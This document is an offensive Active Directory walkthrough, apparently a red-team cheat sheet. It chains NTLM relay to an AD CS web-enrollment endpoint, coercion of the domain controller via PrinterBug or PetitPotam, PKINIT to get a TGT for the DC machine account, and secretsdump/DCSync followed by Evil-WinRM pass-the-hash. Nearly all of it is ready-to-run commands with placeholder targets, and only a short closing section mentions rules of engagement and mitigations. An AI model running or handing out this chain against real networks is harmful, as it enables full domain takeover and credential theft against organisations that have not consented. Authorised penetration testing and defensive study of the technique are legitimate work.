# ADCS Relay → Machine Cert → PKINIT TGT → DC Compromise

**TL;DR**  
Abuse an AD CS HTTP enrollment endpoint by relaying NTLM from a domain member (ideally the DC computer account) to request a machine certificate. Use **PKINIT** with that cert to obtain a Kerberos **TGT** for the machine account, then leverage the TGT to dump secrets and pivot to full domain compromise.

---

## Goal

- Relay coerced NTLM auth to ADCS (`/certsrv/`), enroll a **machine certificate** for `DC01$`.
- Use **PKINITtools** to get a **TGT** for `DC01$` and confirm via `klist`.
- Use **Impacket** (Kerberos auth, no password) to dump domain secrets; pivot to **Evil‑WinRM** with PTH.

## Assumptions & Prereqs

- ADCS Web Enrollment (or vulnerable ESC8-like relay path) reachable at `http(s)://ca.domain.local/certsrv/`.
- You can coerce authentication from **DC01** (or another privileged computer account) to your **ntlmrelayx** listener (e.g., **PrinterBug**, **PetitPotam**, DFSCoerce).  
- Attacker host has: Python 3, **Impacket**, **PKINITtools**, and (if needed) **oscrypto** fixed for ECC/PKI.
- Time is in sync enough for Kerberos.

**Network**

```bash
Attacker (10.10.x.x)  <—NTLM—  DC01  —HTTP(S)—> ADCS /certsrv
           |                          ^ (relay via ntlmrelayx)
           +— Kerberos (PKINIT) —> KDC (DC01 or other DC)
```

---

## High-Level Flow

1) Start **ntlmrelayx** targeting the ADCS enrollment endpoint.  
2) Trigger **coercion** from DC to attacker → relay to ADCS.  
3) Receive `.pfx` for `DC01$` (machine cert).  
4) Use `gettgtpkinit.py` to get a **TGT** (ccache).  
5) Export ticket (KRB5CCNAME), verify with `klist`.  
6) Use `secretsdump.py -k -no-pass` to dump Administrator hash / DIT.  
7) **Evil‑WinRM** pass‑the‑hash to prove access.

---

## Commands — End‑to‑End

### 0) Prep

```bash
python3 -m pip install impacket
# PKINITtools + oscrypto fix depending on env (build/install as needed)
```

### 1) Relay to ADCS

```bash
# Common: specify target ADCS web enrollment endpoint
# If HTTPS w/ NTLM enabled on /certsrv, point at it explicitly
ntlmrelayx.py \
  -t http://ca.domain.local/certsrv/ \
  --adcs \
  --template Machine \
  --outfile DC01.pfx \
  -smb2support
```

> **Note:** Adjust template (e.g., `Machine` / `User`) and CA URL to match. Use `--no-smb2support` if environment breaks with SMB2.

### 2) Coerce DC authentication (choose one)

```bash
# PrinterBug (requires RPC to print spooler)
printerbug.py DOMAIN/DC01$@dc01.domain.local ATTACKER_IP

# PetitPotam (EFSRPC)
PetitPotam.py -d DOMAIN -u user -p pass ATTACKER_IP dc01.domain.local
```

> Any working coercion path is fine; goal is an inbound NTLM you can relay to ADCS.

### 3) You should receive a PFX

`ntlmrelayx` will save a `.pfx` (e.g., `DC01.pfx`). If it’s password‑protected, note the password from relay output.

### 4) Use PKINIT to get TGT

```bash
# Using dirkjanm/PKINITtools
python3 gettgtpkinit.py DOMAIN/DC01\$@DOMAIN.LOCAL \
  -pfx-base64 $(base64 -w0 DC01.pfx) \
  -dc-ip DC_IP \
  dc01.ccache

# Alternative with explicit files
python3 gettgtpkinit.py DOMAIN/DC01\$@DOMAIN.LOCAL \
  -cert-pfx DC01.pfx -pfx-pass <PFX_PASS> \
  -dc-ip DC_IP \
  dc01.ccache
```

### 5) Load & verify ticket

```bash
export KRB5CCNAME=$(pwd)/dc01.ccache
klist
```

### 6) Dump secrets over Kerberos (no pass)

```bash
# Dump Administrator (just DC user) or full DIT
secretsdump.py -k -no-pass -dc-ip DC_IP -just-dc-user Administrator \
  'DOMAIN/DC01$'@dc01.domain.local

# Or DCSync
secretsdump.py -k -no-pass -just-dc DOMAIN/Administrator@dc01.domain.local
```

### 7) Prove access (WinRM PTH)

```bash
evil-winrm -i dc01.domain.local -u Administrator -H <NTLM_HASH>
```

---

## Checks & Troubleshooting

- **Relay fails / 401 loop**: ADCS may not accept NTLM on `/certsrv/` or requires SSL. Try `https://` and confirm ESC1/ESC8 conditions.
- **Template denied**: You need a template that allows **enrollment** for machine accounts (e.g., `Machine`). Check template issuance policy.
- **PKINIT fails**: Ensure time sync, CA chain trust, and correct `DOMAIN/DC01$` UPN format.
- **Kerberos env**: Confirm `KRB5CCNAME` is exported and `klist` shows the machine TGT.

## Safety & Cleanup

- Remove `.pfx` and ccache artifacts from shared systems.  
- In labs, snapshot/rollback. In production tests, follow ROE, report precisely which template/endpoint was abused and mitigations (disable NTLM on `/certsrv/`, restrict templates, require Manager Approval, enforce EKUs, audit coercion paths).

---

## Tools (for reference)

- Impacket (`ntlmrelayx.py`, `secretsdump.py`)
- PKINITtools (`gettgtpkinit.py`)
- Coercion: PrinterBug, PetitPotam, DFSCoerce (as applicable)
- Evil‑WinRM (operator access verification)
